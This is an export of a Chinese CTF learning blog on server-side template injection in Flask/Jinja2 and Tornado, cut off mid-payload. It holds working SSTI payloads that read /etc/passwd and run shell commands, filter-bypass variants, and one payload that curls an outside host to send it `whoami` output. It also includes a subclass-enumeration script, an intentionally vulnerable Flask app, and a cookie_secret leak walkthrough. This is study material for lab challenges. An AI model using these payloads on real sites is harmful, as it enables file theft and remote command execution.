class="language-xml">先获取chr函数，赋值给chr，后面拼接字符串</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% set</span><br><span class="language-xml">chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr</span><br><span class="language-xml">%&#125;</span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">chr</span>(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; ()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read() &#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml"></span><br><span class="language-xml">PS：将其中的request.args改为request.values则利用post的方式进行传参</span><br><span class="language-xml"></span><br><span class="language-xml">执行命令：</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% set</span><br><span class="language-xml">chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr</span><br><span class="language-xml">%&#125;</span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">chr</span>(<span class="hljs-name">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable">()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">request.args.cmd</span>).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml">&amp;cmd=id</span><br></code></pre></td></tr></table></figure><p>过滤双下划线: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;</span><br><span class="hljs-template-variable"><span class="hljs-name">&#x27;&#x27;</span>[request.args.class][request.args.mro][2][request.args.subclasses]()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="hljs-template-variable">&#125;&#125;</span><span class="language-xml">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></code></pre></td></tr></table></figure><p>过滤{undefined{undefined</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">1</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>在url执行py格式命令: </p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">eg:</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;file&#x27; %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="buuctf-Flask-SSTI-1次实战"><a href="#buuctf-Flask-SSTI-1次实战" class="headerlink" title="buuctf [Flask ]SSTI (1次实战)"></a>buuctf [Flask ]SSTI (1次实战)</h1><p>进入页面，啥也没有，f12注释，也没有，那能想到的就是dirsearch扫了<br>嗯…啥也没扫出来，看看robots.txt，也没有…..</p><p>嗯，8会，看wp</p><p>get传参: name&#x3D;4或者{undefined{2*2}}——–(至于为什么是name我也没找到答案)<br>回显是4，说明有ssti漏洞</p><p>构造payload，核心代码: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;type flag.txt&#x27;).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p><p>参考链接:<br><img src="https://www.cnblogs.com/Article-kelp/p/14797393.html" alt="链接"></p><h1 id="脚本找出合适的类"><a href="#脚本找出合适的类" class="headerlink" title="脚本找出合适的类"></a>脚本找出合适的类</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 仅供参考，不是用来抄作业的</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">400</span>):<br>    url=<span class="hljs-string">&quot;http://61ef7259-23f5-43b3-8a0d-111f2e8a2c17.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span><br>    response=res.get(url%i)<br>    <span class="hljs-comment">#BUUCTF中访问速度过快会返回429，此时就需要暂缓再访问</span><br>    <span class="hljs-keyword">if</span> response.status_code!=<span class="hljs-number">200</span>:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        response=res.get(url%i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(response.text),i,response.status_code)<br>    <br></code></pre></td></tr></table></figure><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>tornado是Python下的1个web模板框架<br>进入页面，发现以下可访问项:<br>&#x2F;flag.txt<br>&#x2F;welcome.txt<br>&#x2F;hints.txt<br>分别访问，结果如下:<br>页面: &#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5623eec5b6308052633aef08ea7d497a<br>结果:<br>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p><p>页面: &#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;086cb0e1be24629a233966b3131a3443<br>结果:<br>&#x2F;welcome.txt<br>render</p><p>页面: &#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;0af2fd6996c0cf35b0f7d6f3bd8b29b0<br>结果:<br>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p><p>这个hint….有啥用? cookie_secret: balabala，说白了就是对文件进行哈希验证<br>思路: 根据观察hints.txt以及url的参数得知，需要找到cookie_secret，然后和md5(filename)拼接才能通过验证，查看flag</p><p>存在msg参数(这个msg参数是怎么来的呢? 是发现在尝试注入报错后会返回这么个东西: <a href="http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error">http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error</a>)<br>那么cookie_secret怎么来的呢? 这就考验你查阅官方文档(全tm英文)的能力了</p><p>构造payload: error?msg&#x3D;    (这handler是啥我也8么学，看wp的)<br>就阔以获得cookie_secret了: {‘autoreload’: True, ‘compiled_template_cache’: False, ‘cookie_secret’: ‘3f239178-c592-4337-9b6a-4bf7d50d3a25’} </p><p>md5(filename): 3bf9f6cf685a6dd8defadabfb41a03a1<br>md5(cookie_secret+md5(filename)): b5c5087056961d3c3b65dd600d92d43b<br>成功得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入学习</title>
    <link href="/2022/04/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/04/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>首先，新人初见这个有点蒙圈，8知道怎么学，需要学什么，总之看wp和看文章发现啥也8会，于是在学完后我总结了一下<br>问了下大佬，大概学个原理再加python的flask就可以上手了，其他的框架都是遇到了现学(知道原理即可，本质还是字符串注入)</p><p>然后关于payload的构造，也是非常简单，打开python交互中断跟着敲一遍就会了<br>由于SSTI涉及的模板太多了，因此该学一手tplmap??<br><img src="/images/ssti.jpg"></p><p>比如以下这个有漏洞代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SSTI_TEST<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, %s !<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>正确代码应该是: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125; !<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h1><p>render_template渲染函数的问题<br><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">链接</a><br>即：{undefined{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{undefined{}}包裹的内容当做变量解析替换。比如{undefined{1+1}}会被解析成2<br>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p><h1 id="Flask里的SSTI漏洞"><a href="#Flask里的SSTI漏洞" class="headerlink" title="Flask里的SSTI漏洞"></a>Flask里的SSTI漏洞</h1><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取 flag 或 getshell 的目的。下面以 Python 为例：<br>Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__dict__</span>：保存类实例或对象实例的属性变量键值对字典<br><span class="hljs-emphasis">__class__</span>：返回调用的参数类型<br><span class="hljs-emphasis">__mro__</span>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-emphasis">__bases__</span>：返回类型列表<br><span class="hljs-emphasis">__subclasses__</span>：返回object的子类<br><span class="hljs-emphasis">__init__</span>：类的初始化方法<br><span class="hljs-emphasis">__globals__</span>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价<br></code></pre></td></tr></table></figure><p>通常操作:<br>测试有么有注入: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/login?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml">  /*或者&#123;undenfined&#123;7*7&#125;&#125;，如果返回了49就说明有漏洞*/</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>(int x)<br></code></pre></td></tr></table></figure><p>基类+子类列出所有类, 这些类中含有file\open等函数</p><h1 id="关于python的前置知识"><a href="#关于python的前置知识" class="headerlink" title="关于python的前置知识"></a>关于python的前置知识</h1><p>我们阔以利用的类一般有哪些?<br>file:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(&#x27;/etc/passwd&#x27;)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>以一个简单的flask代码为例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,rendr_template<br>app=Flask(dick)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-comment">#这里呢..是在设置页面内容，是使用flask模板的固定语句，参数为&#x27;/&#x27;，意思就是再访问&#x27;/&#x27;页面时会执行随后定义的index函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;H3llo.html&quot;</span>)   <span class="hljs-comment">#Hllo.html就是会显示的东西</span><br>app.run  <span class="hljs-comment"># 运行我们设置的模板</span><br></code></pre></td></tr></table></figure><p>再来一段完整的flask框架代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string,request<br>app=Flask(__name__) <br>indexhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;just a test&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;&lt;h1&gt;</span><br><span class="hljs-string">why not come &lt;a href=&quot;ssti&quot;&gt;here &lt;/a&gt;to have a look&lt;/h1&gt;</span><br><span class="hljs-string">&lt;/h1&gt;&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>whoareuhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;here s ssti&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;h3&gt;you should tell me who you are then i can say hello to u!(use ?name= in url)&lt;/h3&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tinyhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;here s ssti&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;h1&gt;hello %s&lt;/h1&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> indexhtml<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ssti&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssti</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(whoareuhtml)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(tinyhtml%name)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h1 id="一道payload解析"><a href="#一道payload解析" class="headerlink" title="一道payload解析"></a>一道payload解析</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;   <span class="hljs-comment">#利用数组的父类+子类</span><br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;                <span class="hljs-comment">#catch_warnings是什么鬼? 原因是需要的函数往往在catching_warnings下</span><br>  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;      <br>  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;                   <span class="hljs-comment">#这是何意? </span><br>    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;<br>      &#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;<br>    &#123;% endif %&#125;<br>  &#123;% endif %&#125;<br>  &#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;      <span class="hljs-comment">#至于&#123;%%&#125;这些东西，是用来在html里执行python代码</span><br></code></pre></td></tr></table></figure><h1 id="payload是怎么构造来的-以flask为例"><a href="#payload是怎么构造来的-以flask为例" class="headerlink" title="payload是怎么构造来的(以flask为例)"></a>payload是怎么构造来的(以flask为例)</h1><p>首先，在cmdd输入python，打开交互式界面<br>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__ <br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__   <span class="hljs-comment">#返回&#x27;shit&#x27;的类的父类</span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()   <span class="hljs-comment">#__subclasses()函数返回类的所有子类</span><br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_itemiterator&#x27;</span>&gt;<span class="hljs-comment">#.......以下省略，总之很多]</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__<br>&lt;slot wrapper <span class="hljs-string">&#x27;__init__&#x27;</span> of <span class="hljs-string">&#x27;weakref&#x27;</span> objects&gt;  <span class="hljs-comment">#&quot;&#x27;weakref&#x27;对象的插槽包装器&#x27;__init__&#x27;&quot;(直译，意思就是返回了个函数)</span><br><span class="hljs-comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="hljs-comment">#这里为什么要调用__init__呢，因为python一切皆对象，然后我也解释不清了.....</span><br><span class="hljs-comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如balabala......</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.subclasses__()[<span class="hljs-number">103</span>].__init__.__globals__[<span class="hljs-string">&#x27;builtins&#x27;</span>]<br><span class="hljs-comment"># 以下省略一堆，总之，__globals__[&#x27;builtins&#x27;]选中了builtins模块，这个模块里有很多牛逼的函数(比如eval)</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;type flag.txt&#x27;).read()&quot;</span>)<br><br><span class="hljs-comment">#&lt;!----------------------&gt;</span><br><span class="hljs-comment"># payload2</span><br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).read()&#125;&#125;<br><span class="hljs-comment"># payload3</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;    <br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;  <br>&#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;  <br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;   <br>&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span 